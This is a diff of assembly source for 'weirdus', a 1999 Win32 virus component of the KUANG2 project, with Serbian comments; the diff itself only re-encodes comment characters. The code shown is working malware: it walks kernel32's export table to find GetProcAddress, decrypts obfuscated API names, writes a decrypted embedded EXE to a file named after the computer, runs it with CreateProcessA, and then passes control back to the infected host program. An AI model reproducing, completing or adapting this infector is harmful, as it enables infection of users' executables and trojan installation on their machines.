@@ -1,11 +1,11 @@
 ;***[ThuNderSoft]*************************************************************
 ;								KUANG2: weirdus
 ;								   ver: 0.21
-;								úùÄÍ WEIRD ÍÄùú
+;								     WEIRD
 ;*****************************************************************************
 
 ;* HISTORY *
-; ver 0.21 (18-may-1999): jo„ smanjenja (cmpname)
+; ver 0.21 (18-may-1999): joÅ¡ smanjenja (cmpname)
 ; ver 0.20 (08-mar-1999): standardni oblik radi
 ; ver 0.10 (29-jan-1999): born code
 
@@ -14,15 +14,15 @@
 
 ;**	  weirdus
 ;**	  -------
-;** ş Ovde se nalazi kod virusa koji se kai na EXE fajlove
-;** ş Ceo je u DATA segmentu jer nam je lak„e da mu pristupamo iz Watcoma.
+;** + Ovde se nalazi kod virusa koji se kaÄi na EXE fajlove
+;** + Ceo je u DATA segmentu jer nam je lakÅ¡e da mu pristupamo iz Watcoma.
 ;**	  Moglo je da bude i u CODE segmentu - tada bi morali da koristimo
 ;**	  program PEWRSEC, ali dobija se isto
-;** ş Obrati pa‚nju: program ne sme da bude vezan direktno za bilo „ta -
+;** + Obrati paÅ¾nju: program ne sme da bude vezan direktno za bilo Å¡ta -
 ;**	  sve mora da se radi preko ofseta
-;** ş Zbog baga asemblera? ne mo‚e da radi 'mov eax, [ebp + ofs1 - ofs2] (16 bitno?)
+;** + Zbog baga asemblera? ne moÅ¾e da radi `mov eax, [ebp + ofs1 - ofs2]` (16 bitno?)
 ;**	  Zato moramo da koristimo apsolutnu dodelu.
-;** ş Trenutna veliina: 999 bajta
+;** + Trenutna veliÄina: 999 bajta
 
 
 include weirdus.inc
@@ -43,7 +43,7 @@ PUBLIC _addfile_size, _kript
 ;*******************
 
 _virus_start:
-		push eax				; sauvaj mesto za povratnu adresu (ka hostu)
+		push eax				; saÄuvaj mesto za povratnu adresu (ka hostu)
 		pushad
 		call letsgo
 
@@ -64,7 +64,7 @@ x = _OldEntryPoint - _data_start
 x = strKernel - _data_start
 		lea eax, [ebp+x]
 @@:		cmp byte ptr [eax], 0
-		je @f					; ako smo na kraju, skoi
+		je @f					; ako smo na kraju, skoÄi
 		dec byte ptr [eax]
 		inc eax
 		jmp @b					; vrti petlju
@@ -78,7 +78,7 @@ x = _ddGetModuleHandleA - _data_start
 		mov eax, cs:[ebp + x]
 		call dword ptr [eax]	; call GetModuleHandleA
 		test eax, eax
-		jz virus_exit			; ako je nastala gre„ka, skoi
+		jz virus_exit			; ako je nastala greÅ¡ka, skoÄi
 		mov esi, eax			; esi = HMODULE (KERNEL32.DLL)
 
 
@@ -87,16 +87,16 @@ x = _ddGetProcAddress - _data_start
 		mov eax, cs:[ebp+x]		; prvo proveri da li je GetProcAddress
 		test eax, eax			; uvezena u ovom exe fajlu
 		jnz @f					; da, sve je u redu, idi dalje
-								; ne, ajd sad da probamo sami da na”emo
+								; ne, ajd sad da probamo sami da naÄ‘emo
 
-; Sam na”i adresu GetProcAddress ako mo‚e„
+; Sam naÄ‘i adresu GetProcAddress ako moÅ¾eÅ¡
 x = strGetProcAddress - _data_start
 		lea eax, cs:[ebp+x]
 		push eax				; Arg1 = LPCSTR lpProcName
 		push esi				; Arg0 = hModule (KERNEL32.DLL)
 		call near ptr WinGetProcAddress
-		test eax, eax			; da li je f-ja na”ena?
-		jz virus_exit			; nije, skoi
+		test eax, eax			; da li je f-ja naÄ‘ena?
+		jz virus_exit			; nije, skoÄi
 x = ddGetProcAddress - _data_start
 		lea ebx, cs:[ebp+x]
 		mov [ebx], eax			; zapamti adresu f-je
@@ -104,7 +104,7 @@ x = ddGetProcAddress - _data_start
 
 
 ;*******************************
-;*** Na”i adrese WinAPI f-ja ***
+;*** NaÄ‘i adrese WinAPI f-ja ***
 ;*******************************
 ; u cilju smanjenja koda obavezan je ovaj redosled f-ja!
 
@@ -169,7 +169,7 @@ x = cmpname - _data_start
 		call dword ptr [edi+4]	; call GetComputerNameA
 
 ; formiraj jedinstveno ime fajla u filename
-; lepo je „to ComputerName sadr‚i samo za fajlove validne karaktere!
+; lepo je Å¡to ComputerName sadrÅ¾i samo za fajlove validne karaktere!
 x = cmpname - _data_start
 		lea edx, cs:[ebp+x]		; edx -> cmpname
 x = filename - _data_start
@@ -192,7 +192,7 @@ x = filename - _data_start
 temp1:	mov ch, cl
 		sub ch, 'a'
 		cmp ch, 25
-		ja nextchar				; ako nije slovo onda ga upi„i
+		ja nextchar				; ako nije slovo onda ga upiÅ¡i
 		dec cl					; ako je slovo uzmi prethodno (HAL & IBM:)
 		cmp cl, 'a'-1           ; ako je slovo bilo 'a'
 		jne nextchar			; nije
@@ -204,13 +204,13 @@ nextchar:
 		jmp @b
 @@:
 
-; dodaj jo„ extenziju '.exe'
+; dodaj joÅ¡ extenziju '.exe'
 		mov dword ptr [eax], 6578652Eh
 		mov byte ptr [eax+4], 0 ; zatvori string
 
 
 ;*******************************************************************
-;*** Kreiraj fajl ako ga nema, zapi„i u njega virus i zatvori ga ***
+;*** Kreiraj fajl ako ga nema, zapiÅ¡i u njega virus i zatvori ga ***
 ;*******************************************************************
 
 ; kreiraj fajl
@@ -226,12 +226,12 @@ x = filename - _data_start
 		push eax				; Arg0 = lpFileName
 		call dword ptr [edi+8]	; call CreateFileA
 		cmp dword ptr eax, INVALID_HANDLE_VALUE
-		je virus_start			; do„lo je do gre„ke ili virus ve† postoji!
+		je virus_start			; doÅ¡lo je do greÅ¡ke ili virus veÄ‡ postoji!
 
-		mov edx, eax			; nema gre„ke, zapamti handle fajla
-		push eax				; i stavi na stek po„to treba kasnije za CloseHandle
+		mov edx, eax			; nema greÅ¡ke, zapamti handle fajla
+		push eax				; i stavi na stek poÅ¡to treba kasnije za CloseHandle
 
-; dekriptuj i upi„i fajl
+; dekriptuj i upiÅ¡i fajl
 		xor ecx, ecx
 		push ecx				; Arg4 = lpOverlapped
 x = temp - _data_start
@@ -252,7 +252,7 @@ x = _kript - _data_start
 		add bl, 173
 		dec ecx
 		jnz @b
-; upi„i
+; upiÅ¡i
 		call dword ptr [edi+12] ; call WriteFile
 
 ; zatvori kreiran fajl
@@ -295,7 +295,7 @@ x = filename - _data_start
 
 
 ;**************************************
-;*** Iza”i iz virusa i startuj host ***
+;*** IzaÄ‘i iz virusa i startuj host ***
 ;**************************************
 virus_exit:
 		popad
@@ -315,8 +315,8 @@ MyGetProcAddress:
 x = _ddGetProcAddress - _data_start
 		mov edx, cs:[ebp+x]
 		call dword ptr [edx]	; call GetProcAddress
-		test eax, eax			; da li je f-ja na”ena?
-		jz virus_exit			; nije, skoi
+		test eax, eax			; da li je f-ja naÄ‘ena?
+		jz virus_exit			; nije, skoÄi
 		retn
 
 
@@ -324,10 +324,10 @@ x = _ddGetProcAddress - _data_start
 ;*************************
 ;*** WinGetProcAddress ***
 ;*************************
-; u sluaju da GetProcAddress nije uvezena, koristi se ova f-ja
-; za dobavljanje adrese te f-je. Mo‚e da slu‚i i za dobavljanje
+; u sluÄaju da GetProcAddress nije uvezena, koristi se ova f-ja
+; za dobavljanje adrese te f-je. MoÅ¾e da sluÅ¾i i za dobavljanje
 ; svih ostalih adresa, ali bolje da to Windows radi.
-; Znai, ova f-ja je malo modifikovana tako da ide u prilog tome
+; ZnaÄi, ova f-ja je malo modifikovana tako da ide u prilog tome
 ; da se dobavlja samo adresa f-je GetProcAdress.
 WinGetProcAddress:
 		push ebx
@@ -337,8 +337,8 @@ WinGetProcAddress:
 ; uzmi hModule
 		mov edx, [esp+16]
 
-; Brza provera ispravnosti - ovde nam ne treba po„to sigurno
-; tra‚imo f-ju iz validnog handlea kernel32.dll!
+; Brza provera ispravnosti - ovde nam ne treba poÅ¡to sigurno
+; traÅ¾imo f-ju iz validnog handlea kernel32.dll!
 		sub eax, eax
 ;		cmp word ptr [edx], 'ZM'
 ;		jnz @@gpaExit
@@ -347,11 +347,11 @@ WinGetProcAddress:
 ;		cmp dword ptr [edx], 'EP'
 ;		jnz @@gpaExit
 
-; handle je validan - brza provera je pro„la OK
+; handle je validan - brza provera je proÅ¡la OK
 		mov edx, [edx+78h]
 		add edx, [esp+16]
 
-; EDX sada pokazuje na poetak .edata
+; EDX sada pokazuje na poÄetak .edata
 ; [edx+12] -> module name	 RVA
 ; [edx+16] =  ordinal base
 ; [edx+20] =  number of addresses
@@ -361,7 +361,7 @@ WinGetProcAddress:
 		mov ecx, [edx+24]
 		jecxz @@gpaExit
 
-; Pro”i kroz sve stringove dok ne na”e„ isti ili do kraja
+; ProÄ‘i kroz sve stringove dok ne naÄ‘eÅ¡ isti ili do kraja
 		mov edi, [edx+32]
 		add edi, [esp+16]
 
@@ -388,13 +388,13 @@ WinGetProcAddress:
 @@gpaCheckNext:
 		loop short @@gpaLoop
 
-; nije na”en string, vrati gre„ku
+; nije naÄ‘en string, vrati greÅ¡ku
 		sub eax, eax
 		jmp short @@gpaExit
 
 @@gpaOrdinalFound:
-; najzad je na”eno ono „to se tra‚i: (numNames - ECX) je ordinal
-; funkcije iju adresu tra‚imo
+; najzad je naÄ‘eno ono Å¡to se traÅ¾i: (numNames - ECX) je ordinal
+; funkcije Äiju adresu traÅ¾imo
 		mov eax, [edx+24]
 		sub eax, ecx
 		mov ecx, [edx+24h]
@@ -417,8 +417,8 @@ WinGetProcAddress:
 ;********************
 ; ovde slede podaci koji se koriste
 ; stringovi WinAPI su kriptovani
-; da bi se prostor iskoristio „to bolje, stringovi su preklopljeni
-; sa drugim podacima, po„to se stringovi koriste samo na poetku programa
+; da bi se prostor iskoristio Å¡to bolje, stringovi su preklopljeni
+; sa drugim podacima, poÅ¡to se stringovi koriste samo na poÄetku programa
 
 
 _data_start:
@@ -427,13 +427,13 @@ _oldEntryPoint			dd	?
 _oldEntryPointRVA		dd	?
 _oldEPoffs				dd	?
 _oldfilesize			dd	?
-_oldoffs1				dd	?	; veliina poslednje sekcija (SizeOfRawData)
+_oldoffs1				dd	?	; veliÄina poslednje sekcija (SizeOfRawData)
 _olddata1				dd	?
-_oldoffs2				dd	?	; veliina poslednje sekcije u DirectoryData (ako postoji!)
+_oldoffs2				dd	?	; veliÄina poslednje sekcije u DirectoryData (ako postoji!)
 _olddata2				dd	?
 _oldoffs3				dd	?	; karakteristike poslednje sekcije
 _olddata3				dd	?
-_oldoffs4				dd	?	; veliina poslednje sekcije (VirtualSize)
+_oldoffs4				dd	?	; veliÄina poslednje sekcije (VirtualSize)
 _olddata4				dd	?
 _oldoffs5				dd	?	; SizeofImage
 _olddata5				dd	?
@@ -447,7 +447,7 @@ process_information		db 46h, 53h, 4Fh, 46h, 4Dh, 34h
 cmpname					db 33h, 2Fh, 45h, 4Dh, 4Dh, 1	; "ERNEL32.DLL", 0  (ujedno i: dd 0, 0, 0, 0)
 strGetWindowsDirectoryA db 48h, 66h, 75h, 58h, 6Ah, 6Fh
 						db 65h, 70h, 78h, 74h
-startup_info			db 45h, 6Ah, 73h, 66h			; poinje sa dwordom 68, a zatim ide jo„ 16 dworda (68 bajta ukupno)
+startup_info			db 45h, 6Ah, 73h, 66h			; poÄinje sa dwordom 68, a zatim ide joÅ¡ 16 dworda (68 bajta ukupno)
 						db 64h, 75h, 70h, 73h
 						db 7Ah, 42h, 1					; "GetWindowsDirectoryA", 0
 strGetComputerNameA		db 48h, 66h, 75h, 44h, 70h, 6Eh
@@ -472,7 +472,7 @@ filename				db MAX_PATH dup(0), 0
 cmpname_len				dd MAX_COMPUTERNAME_LENGTH+1
 
 ;*** Pointeri na WinAPI f-je ***
-; u cilju smanjenja du‚ine koda ovaj redosled je obavezan!!!!
+; u cilju smanjenja duÅ¾ine koda ovaj redosled je obavezan!!!!
 _ddGetModuleHandleA		dd	?
 _ddGetProcAddress		dd	?
 ddGetProcAddress		dd	?
@@ -483,12 +483,12 @@ ddWriteFile				dd	?
 ddCloseHandle			dd	?
 ddCreateProcessA		dd	?
 
-;*** Ovde †e se smestiti ceo exe fajl ***
-_addfile_size			dd ?	; ovde ide veliina fajla koji je dodat
+;*** Ovde Ä‡e se smestiti ceo exe fajl ***
+_addfile_size			dd ?	; ovde ide veliÄina fajla koji je dodat
 ;_virus_data					; ovde se nalazi exe fajl koga treba zapisati
-								; znai: (&_addfile_size) + sizeof(dd)
+								; znaÄi: (&_addfile_size) + sizeof(dd)
 
-_virus_end:						; Konano... kraj virusa
+_virus_end:						; KonaÄno... kraj virusa
 _DATA ends
 
 end
